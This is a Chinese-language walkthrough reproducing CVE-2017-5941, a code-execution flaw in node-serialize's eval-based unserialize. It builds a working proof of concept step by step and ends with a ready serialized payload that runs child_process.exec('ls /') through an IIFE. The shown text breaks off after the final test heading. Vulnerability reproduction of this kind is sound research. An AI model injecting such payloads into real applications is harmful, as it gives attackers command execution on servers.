# node-serialize 反序列化（CVE-2017-5941）

## 漏洞本地复现

首先看这个[node-serialize库](https://github.com/luin/serialize)，其中实现反序列化的代码

```node
unserialize = function(obj, originObj) {
    var isIndex;
    if (typeof obj === 'string') {
      obj = JSON.parse(obj);
      isIndex = true;
    }
    originObj = originObj || obj;

    var circularTasks = [];
    var key;
    for(key in obj) {
      if(obj.hasOwnProperty(key)) {
        if(typeof obj[key] === 'object') {
          obj[key] = unserialize(obj[key], originObj);
        } else if(typeof obj[key] === 'string') {
          if(obj[key].indexOf(FUNCFLAG) === 0) {
            obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');
          } else if(obj[key].indexOf(CIRCULARFLAG) === 0) {
            obj[key] = obj[key].substring(CIRCULARFLAG.length);
            circularTasks.push({obj: obj, key: key});
          }
        }
      }
    }

    if (isIndex) {
      circularTasks.forEach(function(task) {
        task.obj[task.key] = getKeyPath(originObj, task.obj[task.key]);
      });
    }
    return obj;
  };
```

其中`var FUNCFLAG = '_$$ND_FUNC$$_';`
可以看出代码中使用了`eval`执行代码，再深入看一下能够执行形成的条件。
1. obj[key] 类型为`string`
2. obj[key] 以`_$$ND_FUNC$$_`开头，即`FUNCFLAG`

首先测试函数序列化后，其类型是否为`string`，根据上面给出的源码，序列化后的数据需要`JSON.parse`之后再判断类型，再其给出的测试代码文件中，写入如下代码


```node
require('should');
var serialize = require('..');

var req_data = {func:function(){require("child_process").exec("ls /", function(error, stdout, stderr){console.log(stdout);});}};
var serialize_data = serialize.serialize(req_data);
var json_data = JSON.parse(serialize_data);

if (typeof json_data['func'] === 'string') {
  console.log("string type!");
} else {
  console.log("other type!");
}
```

测试一下

![](https://lh3.googleusercontent.com/-wLXE-POSpbc/WqDcCAZ7JmI/AAAAAAAAHLY/IPVrqyHBHAYFhVdkLsfagFW-vEumvS3JACHMYCw/I/15204871260334.jpg)

所以我们提交的数据反序列化后成功的到达`eval`的括号中，再来测试`eval`是否能够真正的执行。测试代码如下

```node
require('should');
var serialize = require('..');

var req_data = {func:function(){require("child_process").exec("ls /", function(error, stdout, stderr){console.log(stdout);});}};
var serialize_data = serialize.serialize(req_data);
var json_data = JSON.parse(serialize_data);

console.log(json_data);
var FUNCFLAG = '_$$ND_FUNC$$_';
var func_exec = json_data['func'];
console.log(func_exec.substring(FUNCFLAG.length));
eval('(' + func_exec.substring(FUNCFLAG.length) + ')');
```

执行一下

![](https://lh3.googleusercontent.com/-1n_oT7yvsCI/WqDcC9j7DRI/AAAAAAAAHLc/h0B4tePRRS0xNOeYyrcufPA6CWBrYeRtwCHMYCw/I/15204879387218.jpg)

可以发现`eval`中的函数并没有执行，根据javascript的立即执行函数表达式（IIFE），我们在最后`eval`加一对括号试试

```node
require('should');
var serialize = require('..');

var req_data = {func:function(){require("child_process").exec("ls /", function(error, stdout, stderr){console.log(stdout);});}};
var serialize_data = serialize.serialize(req_data);
var json_data = JSON.parse(serialize_data);

console.log(json_data);
var FUNCFLAG = '_$$ND_FUNC$$_';
var func_exec = json_data['func'];
console.log(func_exec.substring(FUNCFLAG.length));
eval('(' + func_exec.substring(FUNCFLAG.length) + '())');
```

测试一下

![](https://lh3.googleusercontent.com/-NpfK102ZqEc/WqDcDX-CaNI/AAAAAAAAHLg/M84qxBT25bYSgyl5YzfqFywWhvs9Pvk7gCHMYCw/I/15204881267209.jpg)

发现代码已经成功执行，在这个测试过程中，没有直接使用`unserialize`，而是根据其代码直接构造出了`POC`，现在先用`serialize`得到数据，再用`unserialize`执行代码试试。这里有一点需要注意，我们在序列化前不能直接将`func`利用IIFE的形式写，因为这样的话，在序列化前函数已经执行，导致序列化失败，也就无法得到序列化数据了

测试代码


```node
require('should');
var serialize = require('..');

var req_data = {func:function(){require("child_process").exec("ls /", function(error, stdout, stderr){console.log(stdout);});}()};  //注意看这里末尾有一对括号！造成IIFE！
var serialize_data = serialize.serialize(req_data);
console.log(serialize_data);
```

先直接测试序列化IIFE的函数

![](https://lh3.googleusercontent.com/-0iZoYmny2qs/WqDcD0Vp7UI/AAAAAAAAHLk/7Mo96PYk2UIlAJLtCdsiiQuuFNz-kslmgCHMYCw/I/15204885513197.jpg)


可以看到序列化直接失败，输出数据为空。

再来序列化非IIFE数据


```node
require('should');
var serialize = require('..');

var req_data = {func:function(){require("child_process").exec("ls /", function(error, stdout, stderr){console.log(stdout);});}};  //这里没有括号
var serialize_data = serialize.serialize(req_data);
console.log(serialize_data);
```

序列化成功

![](https://lh3.googleusercontent.com/-2Zaz8iZnn5c/WqDcEKbF00I/AAAAAAAAHLo/vv_kJlx7QjQkU6gJS-lbIKNhg4ZJaRAfACHMYCw/I/15204887483509.jpg)

利用序列化的字符串末尾加上一对括号，造成在反序列化时的IIFE，并且需要注意转义反斜杠，具体看代码


```node 
require('should');
var serialize = require('..');

//var req_data = {func:function(){require("child_process").exec("ls /", function(error, stdout, stderr){console.log(stdout);});}};
//var serialize_data = serialize.serialize(req_data);
//console.log(serialize_data);

var data = '{"func":"_$$ND_FUNC$$_function (){require(\\"child_process\\").exec(\\"ls /\\", function(error, stdout, stderr){console.log(stdout);});}()"}'; // 末尾有括号，而且转义了斜杠
console.log(data);
var unserialize_data = serialize.unserialize(data);
console.log(unserialize_data);
```

测试如下

